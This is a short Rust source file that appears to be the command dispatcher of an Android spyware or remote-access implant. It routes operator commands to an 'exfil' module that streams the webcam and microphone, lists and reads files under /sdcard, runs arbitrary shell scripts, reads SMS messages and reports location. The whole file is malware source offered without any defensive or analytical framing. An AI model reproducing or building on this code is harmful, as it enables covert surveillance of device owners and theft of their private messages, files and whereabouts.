use crate::exfil;
use serde_json::{json, Value};


pub async fn execute_command(action: &str, args: &str) -> Value {
    let args_json: Value = serde_json::from_str(args).unwrap_or(json!({}));
    
    match action {
        "screenshot" => {
            json!({"status": "requires_media_projection"})
        },
        "webcam_stream" => {
            exfil::start_webcam_stream(&args_json)
        },
        "mic_stream" => {
            exfil::start_mic_stream(&args_json)
        },
        "file_list" => {
            let path = args_json.get("path").and_then(|s| s.as_str()).unwrap_or("/sdcard");
            exfil::list_files(path)
        },
        "file_read" => {
            let path = args_json.get("path").and_then(|s| s.as_str()).unwrap_or("");
            exfil::read_file(path)
        },
        "execute" => {
            let script = args_json.get("script").and_then(|s| s.as_str()).unwrap_or("");
            exfil::execute_shell(script)
        },
        "sms_read" => {
            exfil::read_sms(&args_json)
        },
        "location" => {
            exfil::get_location(&args_json)
        },
        _ => json!({"error": "Unknown command"})
    }
}
